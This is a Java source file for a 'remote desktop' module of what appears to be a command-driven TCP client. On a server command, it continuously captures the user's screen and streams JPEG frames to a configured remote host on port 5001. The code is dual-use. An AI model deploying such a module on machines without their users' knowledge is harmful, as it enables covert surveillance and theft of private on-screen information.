package clientetcp_mac.modulos.impl;

import Global.config;
import clientetcp_mac.ArmazenarInstacias;
import clientetcp_mac.modulos.IModulo;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.awt.Robot;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.io.ByteArrayOutputStream;

public class ModuloRemoteDesktop implements IModulo {

    private boolean rodando = false;
    private Socket socketVideo;

    @Override
    public boolean podeProcessar(String comando) {
        return comando.equalsIgnoreCase("pr:StartRemoteDesktop") || comando.equalsIgnoreCase("pr:StopRemoteDesktop");
    }

    @Override
    public void executar(String comando, ArmazenarInstacias instancias, ArrayList<String> textoRecebido) {
        if (comando.equalsIgnoreCase("pr:StartRemoteDesktop")) {
            iniciarTransmissao(instancias);
        } else if (comando.equalsIgnoreCase("pr:StopRemoteDesktop")) {
            pararTransmissao();
        }
    }

    private void iniciarTransmissao(ArmazenarInstacias instancias) {
        if (rodando) return;
        rodando = true;
        
        new Thread(() -> {
            try {
                socketVideo = new Socket(config.enderecoSevidor, 5001);
                DataOutputStream out = new DataOutputStream(socketVideo.getOutputStream());
                Robot robot = new Robot();
                Rectangle rect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                System.out.println("Enviando vídeo!");
                
                while (rodando) {
                    BufferedImage imagem = robot.createScreenCapture(rect);
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ImageIO.write(imagem, "jpg", baos);
                    byte[] imageBytes = baos.toByteArray();
                    
                    out.writeInt(3);
                    out.writeInt(imageBytes.length);
                    out.write(imageBytes);
                    out.flush();
                    
                    Thread.sleep(100);
                }
            } catch (Exception e) {
                System.out.println("Erro na transmissão de vídeo: " + e.getMessage());
                rodando = false;
            }
        }).start();
        instancias.getOut().println("Remote Desktop Iniciado na porta 5001");
        instancias.getOut().flush();
    }

    private void pararTransmissao() {
        rodando = false;
        try {
            if (socketVideo != null && !socketVideo.isClosed()) {
                socketVideo.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
